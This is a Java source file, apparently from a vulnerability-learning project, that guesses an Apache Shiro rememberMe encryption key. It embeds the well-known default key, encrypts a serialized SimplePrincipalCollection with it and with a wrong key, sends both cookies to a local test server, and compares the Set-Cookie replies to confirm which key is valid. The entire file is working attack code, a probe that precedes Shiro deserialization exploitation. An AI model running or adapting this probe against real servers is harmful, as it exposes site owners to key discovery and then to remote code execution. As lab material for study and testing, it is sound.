package summersec.shirodemo.Payload;

import cn.hutool.core.io.file.FileReader;
import cn.hutool.http.Header;
import cn.hutool.http.HttpRequest;
import cn.hutool.http.HttpResponse;
import org.apache.shiro.subject.SimplePrincipalCollection;
import summersec.shirodemo.Encrypt.CbcEncrypt;

import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;

/**
 * @ClassName: KeyVaule
 * @Description: TODO
 * @Author: Summer
 * @Date: 2021/1/22 18:40
 * @Version: v1.0.0
 * @Description: 使用SimplePrincipalCollection 进行猜解key值
 **/
public class KeyVaule {
    public static void main(String[] args) throws IOException {
        // 正确key
        String realkey = "kPH+bIxk5D2deZiIxcaaaA==";
        // 错误key
        String errorkey = "2AvVhdsgUs0FSA3SDFAdag==";
        // 序列化文件路径
        String filepath = "E:\\Soures\\JavaLearnVulnerability\\shiro\\shiro-deser\\key";

        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(filepath));
        try {
            // 写入序列化数据
            obj.writeObject(simplePrincipalCollection);
            obj.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        FileReader fileReader = new FileReader(filepath);

        CbcEncrypt cbcEncrypt = new CbcEncrypt();
        String realcookie = "rememberMe=" + cbcEncrypt.encrypt(realkey,fileReader.readBytes());
        String errorcookie = "rememberMe=" + cbcEncrypt.encrypt(errorkey,fileReader.readBytes());
        System.out.println("realcookie --> " + realcookie);
        System.out.println("errorcookie --> " + errorcookie);
        String url = "http://127.0.0.1:8001/index";
        // 发送请求包，获取返回包
        HttpResponse realresponse = HttpRequest.get(url).cookie(realcookie).execute();
        HttpResponse errorresponse = HttpRequest.get(url).cookie(errorcookie).execute();
        String result1 = realresponse.header(Header.SET_COOKIE);
        String result2 = errorresponse.header(Header.SET_COOKIE);
        // 输出结果
        System.out.println("realkey ---> " + result1);
        System.out.println("errorkey ---> " + result2);



    }
}
